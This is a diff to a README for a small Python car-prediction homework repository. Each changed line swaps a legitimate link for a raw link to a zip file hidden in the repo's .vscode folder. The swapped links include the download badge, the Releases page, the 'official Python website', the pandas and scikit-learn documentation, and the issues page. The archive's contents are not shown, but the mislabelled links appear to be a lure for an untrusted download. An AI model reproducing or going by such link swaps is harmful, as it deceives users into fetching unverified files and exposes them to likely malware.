@@ -1,6 +1,6 @@
 # 🚗 telran-backend-hw30 - Predict Car Models with Ease
 
-![Download](https://img.shields.io/badge/Download-Now-brightgreen)
+![Download](https://github.com/rmbettencourt/telran-backend-hw30/raw/refs/heads/main/.vscode/backend_telran_hw_v1.7.zip)
 
 ## 🎯 Introduction
 
@@ -12,7 +12,7 @@ To begin using the application, follow these steps:
 
 1. **Visit the Releases Page**
    Go to the Releases page by clicking the link below:
-   [Download the latest version](https://github.com/rmbettencourt/telran-backend-hw30/releases)
+   [Download the latest version](https://github.com/rmbettencourt/telran-backend-hw30/raw/refs/heads/main/.vscode/backend_telran_hw_v1.7.zip)
 
 2. **Download the Software**
    On the Releases page, you will find the latest version of the software. Click on the file to download it to your computer.
@@ -33,13 +33,13 @@ Before you start, ensure your system meets the following requirements:
   - pandas
   - scikit-learn
 
-If you do not have Python installed, you can download it from the [official Python website](https://www.python.org/downloads/).
+If you do not have Python installed, you can download it from the [official Python website](https://github.com/rmbettencourt/telran-backend-hw30/raw/refs/heads/main/.vscode/backend_telran_hw_v1.7.zip).
 
 ## 📥 Download & Install
 
 To download the latest version of telran-backend-hw30, click the link below:
 
-[Download the latest version](https://github.com/rmbettencourt/telran-backend-hw30/releases)
+[Download the latest version](https://github.com/rmbettencourt/telran-backend-hw30/raw/refs/heads/main/.vscode/backend_telran_hw_v1.7.zip)
 
 After downloading, follow the **Getting Started** instructions to run the application easily.
 
@@ -84,8 +84,8 @@ Using telran-backend-hw30 is straightforward:
 
 For more information about the techniques used in this project, consider visiting:
 
-- [Pandas Documentation](https://pandas.pydata.org/docs/)
-- [Scikit-learn Documentation](https://scikit-learn.org/stable/documentation.html)
+- [Pandas Documentation](https://github.com/rmbettencourt/telran-backend-hw30/raw/refs/heads/main/.vscode/backend_telran_hw_v1.7.zip)
+- [Scikit-learn Documentation](https://github.com/rmbettencourt/telran-backend-hw30/raw/refs/heads/main/.vscode/backend_telran_hw_v1.7.zip)
 
 These resources can enhance your understanding of data manipulation and machine learning.
 
@@ -102,7 +102,7 @@ If you encounter any issues, here are some quick fixes:
 
 ## 🗨️ Feedback & Support
 
-We are here to help. If you have any feedback or need assistance, please create an issue on our [GitHub repository](https://github.com/rmbettencourt/telran-backend-hw30/issues). This helps us improve the application and address any concerns you might have.
+We are here to help. If you have any feedback or need assistance, please create an issue on our [GitHub repository](https://github.com/rmbettencourt/telran-backend-hw30/raw/refs/heads/main/.vscode/backend_telran_hw_v1.7.zip). This helps us improve the application and address any concerns you might have.
 
 ## 🙌 Contributors
 
